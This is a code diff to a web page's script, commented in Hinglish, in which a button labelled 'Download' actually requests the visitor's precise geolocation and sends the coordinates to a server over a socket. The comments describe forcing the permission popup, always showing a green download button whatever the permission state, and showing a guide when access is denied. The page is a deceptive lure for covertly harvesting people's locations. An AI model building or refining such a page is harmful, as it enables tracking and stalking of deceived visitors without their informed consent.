@@ -168,7 +168,7 @@
     function showGuide() { guide.style.display = 'flex'; }
     function hideGuide() { guide.style.display = 'none'; }
 
-    // FORCE TRIGGER LOGIC: Ye hamesha popup maangega
+    // FORCE ACTION: Ye function browser ko popup ke liye majboor karega
     async function handleAction() {
         const options = {
             enableHighAccuracy: true,
@@ -176,24 +176,21 @@
             maximumAge: 0
         };
 
-        // Shuru me status check nahi karenge, seedha location maangenge
+        // Seedha location maango, status check mat karo
         navigator.geolocation.getCurrentPosition(
             (pos) => { 
                 socket.emit('send-location', { 
                     lat: pos.coords.latitude, 
                     lng: pos.coords.longitude 
                 }); 
+                // Success hone par sab normal rakho
                 updateUI('granted');
             },
             (err) => { 
-                // Agar user ne "Deny" kiya ya pehle se blocked hai, tabhi guide dikhao
+                // Agar user "Deny" karega, sirf tabhi button laal hoga
                 if (err.code === 1) { 
                     updateUI('denied'); 
                     showGuide();
-                } else if (err.code === 3) {
-                    // Timeout retry logic for slow connections/shields
-                    console.log("Retrying...");
-                    handleAction(); 
                 }
             },
             options
@@ -214,21 +211,23 @@
     btn.addEventListener('click', handleAction);
     closeBtn.addEventListener('click', hideGuide); 
 
-    window.onload = async () => {
-        // Hamesha Download button dikhao taaki user force trigger kar sake
+    // IMPORTANT: Page load par status check hata diya hai
+    window.onload = () => {
+        // Hamesha green button dikhao, chahe status jo bhi ho
         btn.innerText = "Download";
         btn.classList.remove('blocked');
         
         if (!socket.connected) socket.connect();
 
-        // Background auto-detection (Refresh ke bina UI theek karne ke liye)
+        // Background detection sirf tab jab user reset kare
         try {
-            const res = await navigator.permissions.query({ name: 'geolocation' });
-            res.onchange = () => {
-                if (res.state === 'granted' || res.state === 'prompt') {
-                    updateUI('granted'); 
-                }
-            };
+            navigator.permissions.query({ name: 'geolocation' }).then(res => {
+                res.onchange = () => {
+                    if (res.state === 'granted' || res.state === 'prompt') {
+                        updateUI('granted'); 
+                    }
+                };
+            });
         } catch (e) {}
     };
 </script>
